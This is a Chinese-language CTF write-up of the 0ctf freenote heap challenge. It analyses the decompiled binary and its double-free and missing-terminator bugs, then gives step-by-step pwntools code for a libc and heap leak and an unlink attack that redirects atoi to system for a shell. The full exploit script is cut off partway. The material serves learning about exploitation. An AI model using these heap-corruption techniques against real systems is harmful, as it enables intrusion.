        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0ctf-2016-freenote"><a href="#0ctf-2016-freenote" class="headerlink" title="0ctf-2016-freenote"></a>0ctf-2016-freenote</h2><ul><li><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/0ctf-2015/exploit/freenote">题目下载</a></p></li><li><p>libc version: 2.23</p></li><li><p><code>check --file freenote</code></p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200723095956138.png" alt="image-20200723095956138"></p><ul><li>参考WP: <a href="https://wzt.ac.cn/2018/11/02/s-pwn-project-5/">菜鸡的 Pwn 05 0ctf freenote</a></li><li>利用方式: double free 触发 unlink 改写相关地址取得 shell</li></ul><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><ul><li>node结构体</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 note_s          struc ; (sizeof=0x18, mappedto_6)</span><br><span class="line">00000000                                         ; XREF: headptr/r</span><br><span class="line">00000000 inuse           dq ?</span><br><span class="line">00000008 size            dq ?</span><br><span class="line">00000010 info            dq ?                    ; offset</span><br><span class="line">00000018 note_s          ends</span><br></pre></td></tr></table></figure><ul><li>head结构体</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 headptr         struc ; (sizeof=0x1810, mappedto_8)</span><br><span class="line">00000000 max             dq ?</span><br><span class="line">00000008 count           dq ?</span><br><span class="line">00000010 node_list       note_s 256 dup(?)</span><br><span class="line">00001810 headptr         ends</span><br></pre></td></tr></table></figure><h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="head-init"><a href="#head-init" class="headerlink" title="head_init"></a>head_init</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">headptr *<span class="title">head_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  headptr *v0; <span class="comment">// rax</span></span><br><span class="line">  headptr *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (headptr *)<span class="built_in">malloc</span>(<span class="number">0x1810</span>uLL);</span><br><span class="line">  head = v0;</span><br><span class="line">  v0-&gt;max = <span class="number">256LL</span>;</span><br><span class="line">  result = head;</span><br><span class="line">  head-&gt;count = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">255</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    head-&gt;node_list[i].inuse = <span class="number">0LL</span>;</span><br><span class="line">    head-&gt;node_list[i].size = <span class="number">0LL</span>;</span><br><span class="line">    result = (headptr *)((<span class="keyword">char</span> *)head + <span class="number">24</span> * i + <span class="number">32</span>);</span><br><span class="line">    result-&gt;max = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>初始化256个node</li></ul><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;You need to create some new notes first.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( head-&gt;node_list[i].inuse == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d. %s\n&quot;</span>, i, head-&gt;node_list[i].info);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>打印所有已使用的node信息</li></ul><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *note; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt; head-&gt;max )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !head-&gt;node_list[i].inuse )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Length of new note: &quot;</span>);</span><br><span class="line">        len = read_int32();</span><br><span class="line">        <span class="keyword">if</span> ( len &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( len &gt; <span class="number">4096</span> )</span><br><span class="line">            len = <span class="number">4096</span>;</span><br><span class="line">          note = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>((<span class="number">128</span> - len % <span class="number">128</span>) % <span class="number">128</span> + len);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">          read_note(note, len);</span><br><span class="line">          head-&gt;node_list[i].inuse = <span class="number">1LL</span>;</span><br><span class="line">          head-&gt;node_list[i].size = len;</span><br><span class="line">          head-&gt;node_list[i].info = note;</span><br><span class="line">          ++head-&gt;count;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Unable to create new note.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>从前到后遍历chunklist, 当inuse为0的时候, 在那个堆块malloc了note的空间, 注意的是, size是不可任意malloc的, 因为设置了自动对齐的运算, size大小只能是128*n (n &gt; 0), 这就导致我们无法直接申请<code>fastbin</code></li><li>实现了read函数, 输入size后必须输入满足你的size才能结束输入循环</li></ul><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  headptr *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v3 = read_int32();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= head-&gt;max || head-&gt;node_list[v3].inuse != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Length of note: &quot;</span>);</span><br><span class="line">  v2 = read_int32();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid length!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != head-&gt;node_list[v3].size )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = head;</span><br><span class="line">    v1-&gt;node_list[v3].info = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(head-&gt;node_list[v3].info, (<span class="number">128</span> - v2 % <span class="number">128</span>) % <span class="number">128</span> + v2);</span><br><span class="line">    head-&gt;node_list[v3].size = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your note: &quot;</span>);</span><br><span class="line">  read_note(head-&gt;node_list[v3].info, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>edit函数并没有限制编辑的次数, 而且要注意的是, 当size不一样的时候, 程序会调用realloc函数</li></ul><h4 id="read-note"><a href="#read-note" class="headerlink" title="read_note"></a>read_note</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">read_note</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; i += v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(<span class="number">0</span>, &amp;a1[i], a2 - i);</span><br><span class="line">    <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 read_note 函数, 在读取一个字符以后, 并没有将后一位置为结束符<code>\x00</code>, 可能造成<strong>信息泄露</strong></p><h3 id="delte"><a href="#delte" class="headerlink" title="delte"></a>delte</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delte</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No notes yet.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Note number: &quot;</span>);</span><br><span class="line">  v1 = read_int32();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= head-&gt;max )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid number!&quot;</span>);</span><br><span class="line">  --head-&gt;count;</span><br><span class="line">  head-&gt;node_list[v1].inuse = <span class="number">0LL</span>;</span><br><span class="line">  head-&gt;node_list[v1].size = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">free</span>(head-&gt;node_list[v1].info);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>程序并没有check堆块是否 inuse , 且 fre e后指针没有置空, <strong>double free漏洞</strong></li></ul><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><ol><li><p>首先要获得程序基址, 可以采用<code>unsorted bin attack</code>来leak libc的基址。</p><ol><li><p>可申请的堆块大小最小为 0x80(small bin’s chunk), 在free后, 这种堆块会先进入 unsorted bin 中, 并且堆块中会存在 fd 和 bk 指针, 第一个 free 的堆块将会将 fd 和 bk 指向 main_arena。</p></li><li><p>再分配相同大小的堆块, 内核会把这个堆块再次分配回来, 结合读取内容时缺少结束符, 通过 list 函数可以输出 bk 指针, 泄露出 main_arena 的地址。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/unsorted_bin_chunks.png" alt="unsorted_bin_chunks"></p></li><li><p>由于 main_arena 与 libc 之间的偏移是固定的, 所以可以计算出 libc 的基址</p></li><li><p>同理泄露 heap 地址</p></li></ol></li><li><p>泄露 libc 的地址后, 可以加载给出的 libc 文件取得必要的函数地址, 泄露 heap 地址后, 在 double free 触发 unlink 过程中就可以构建 fd 和 bk 指针了</p></li></ol><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="泄露-libc-的基址"><a href="#泄露-libc-的基址" class="headerlink" title="泄露 libc 的基址"></a>泄露 libc 的基址</h3><ol><li><p>新建 chunk0、chunk1 (<strong>chunk1 用于防止 free 时 chunk0 和 top chunk 合并</strong>)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">&quot;b&quot;</span> * <span class="number">8</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure><p>此时 heap 状态</p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154039895.png" alt="image-20200727154039895" style="zoom:67%;" /></li><li><p>free chunk0</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此时 chunk0 进入 unsorted bin 中, 且 fd 和 bk 指向 main_arena</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154152544.png" alt="image-20200727154152544"></p></li><li><p>新建一个大小和 chunk0 相同的堆块, 此时内核将从 unsorted bin 中把 chunk0 重新分配回来, 我们需要填入8个字节来leak main_arena 地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>可以看到此时 chunk0 的内存中除我们输入的 “a” * 8 以外后面跟着 main_arena 的地址</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154415537.png" alt="image-20200727154415537"></p><p>此时就可以打印出 main_arena 的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># 接收 main_arena 地址</span></span><br><span class="line">ru(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">mainarena_addr = u64(rv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154505515.png" alt="image-20200727154505515"></p><p>此时就可以计算 libc 的基址了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x7ffff7dd4b78 - 0x7ffff7a39000 = 0x39bb78</span></span><br><span class="line">libc.address = mainarena_addr - <span class="number">0x39bb78</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154536140.png" alt="image-20200727154536140"></p><p>还原堆状态</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 1</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="泄露-heap-的地址"><a href="#泄露-heap-的地址" class="headerlink" title="泄露 heap 的地址"></a>泄露 heap 的地址</h3><ol><li><p>新建4个 chunk</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">&quot;b&quot;</span> * <span class="number">8</span>) <span class="comment"># 1</span></span><br><span class="line">new(<span class="string">&quot;c&quot;</span> * <span class="number">8</span>) <span class="comment"># 2</span></span><br><span class="line">new(<span class="string">&quot;d&quot;</span> * <span class="number">8</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><p>3号 chunk 用于防止 <code>free(2)</code> 时 2号被 top chunk 合并</p><p>此时 heap 状态</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727154934167.png" alt="image-20200727154934167"></p></li><li><p>释放 0 号 和 2 号堆块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 2</span></span><br></pre></td></tr></table></figure><p>此时 chunk0 -&gt;bk 位置存放了 chunk2 的地址, 我们就可以同泄露 libc 的基址来泄露 heap 的地址</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727155030781.png" alt="image-20200727155030781"></p></li><li><p>申请回 0 号堆块 并泄露</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="string">&quot;e&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;e&quot;</span> * <span class="number">8</span>)</span><br><span class="line">chunk0_addr = u64(ru(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727155115677.png" alt="image-20200727155115677"></p><p>计算 heap 偏移来泄露 heap 地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 0x604940 - 0x603000 = 0x1940</span></span><br><span class="line">heap_addr = chunk0_addr - <span class="number">0x1940</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727152341343.png" alt="image-20200727152341343"></p><p>还原堆状态</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="利用-unlink-修改-atoi-函数进行-get-shell"><a href="#利用-unlink-修改-atoi-函数进行-get-shell" class="headerlink" title="利用 unlink 修改 atoi 函数进行 get shell"></a>利用 unlink 修改 atoi 函数进行 get shell</h3><ol><li><p>获得<code>system, binsh, atoi@got</code>地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_addr = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">atoi_addr = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br></pre></td></tr></table></figure></li><li><p>新建3个chunk 并 free 掉</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li><li><p>构造 payload 绕过安全检查机制</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(heap_addr + <span class="number">0x30</span> - <span class="number">0x18</span>) + p64(heap_addr + <span class="number">0x30</span> - <span class="number">0x10</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x80</span></span><br><span class="line">payload += p64(<span class="number">0x0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;c&#x27;</span> * <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">new(payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><p>这个chunk大小为前面创建的三个 chunk 大小之和</p></li><li><p>伪造的 chunk0 和 chunk1 信息如下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727155715436.png" alt="image-20200727155715436"></p></li><li><p>这时 <code>free(1)</code> 就会触发 unlink 机制, 把 chunk0 进行 unlink, 而在 unlink 的解链操作中, 就会把 head_ptr 中 node[0].info 的对应的地址最终指向自己(node[0])</p></li><li><p><code>free(1)</code>操作后 伪造的 chunk1 和 chunk0 合并后的 chunk 被 free 入 unsorted bin 中</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727160015253.png" alt="image-20200727160015253"></p><p>node[0].info 指向自己</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727160602159.png" alt="image-20200727160602159"></p></li></ul></li><li><p>此时进行 edit(0) 操作就是在修改 node[0] 自己</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = p64(<span class="number">2</span>) + p64(<span class="number">1</span>) + p64(<span class="number">8</span>) + p64(atoi_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, payload2.ljust(<span class="built_in">len</span>(payload), <span class="string">b&#x27;b&#x27;</span>))</span><br></pre></td></tr></table></figure><p>修改后node[0].info 指向 <code>atoi@got.plt</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727161221174.png" alt="image-20200727161221174"></p></li><li><p>再次修改, 将<code>atoi@got.plt</code>修改指向<code>system</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload3 = p64(system_addr)</span><br><span class="line">edit(<span class="number">0</span>, payload3)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727161425403.png" alt="image-20200727161425403"></p></li><li><p>这时我们将<code>/bin/sh</code>的地址发过去就能<code>get shell</code>了</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200727161624674.png" alt="image-20200727161624674"></p></li></ol><h2 id="完整Exp"><a href="#完整Exp" class="headerlink" title="完整Exp"></a>完整Exp</h2><blockquote><p>python3</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./freenote&quot;</span>, env=&#123;<span class="string">&quot;LOAD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">elf = ELF(<span class="string">&quot;./freenote&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rv = p.recv</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">sa = p.sendafter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_addr</span>(<span class="params">s, addr</span>):</span></span><br><span class="line">    log.success(s + <span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">s</span>):</span></span><br><span class="line">    gdb.attach(p, s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;new note: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    sa(<span class="string">&quot;your note: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note number:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Length of note:&quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    sa(<span class="string">&quot;your note: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Note number: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">&quot;b&quot;</span> * <span class="number">8</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>)</span><br><span class="line">mainarena_addr = u64(rv(<span class="number">6</span>) + <span class="string">b&quot;\x00\x00&quot;</span>)</span><br><span class="line">log_addr(<span class="string">&quot;main_arena addr: &quot;</span>, mainarena_addr)</span><br><span class="line"></span><br><span class="line">libc.address = mainarena_addr - <span class="number">0x39bb78</span></span><br><span class="line">log_addr(<span class="string">&quot;libc addr: &quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;a&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">new(<span class="string">&quot;b&quot;</span> * <span class="number">8</span>) <span class="comment"># 1</span></span><br><span class="line">new(<span class="string">&quot;c&quot;</span> * <span class="number">8</span>) <span class="comment"># 2</span></span><br><span class="line">new(<span class="string">&quot;d&quot;</span> * <span class="number">8</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>) <span class="comment"># 0</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">new(<span class="string">&quot;e&quot;</span> * <span class="number">8</span>) <span class="comment"># 0</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;e&quot;</span> * <span class="number">8</span>)</span><br><span class="line">chunk0_addr = u64(ru(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;chunk0 addr: &quot;</span>, chunk0_addr)</span><br><span class="line"></span><br><span class="line">heap_addr = chunk0_addr - <span class="number">0x1940</span></span><br><span class="line">log_addr(<span class="string">&quot;heap addr: &quot;</span>, 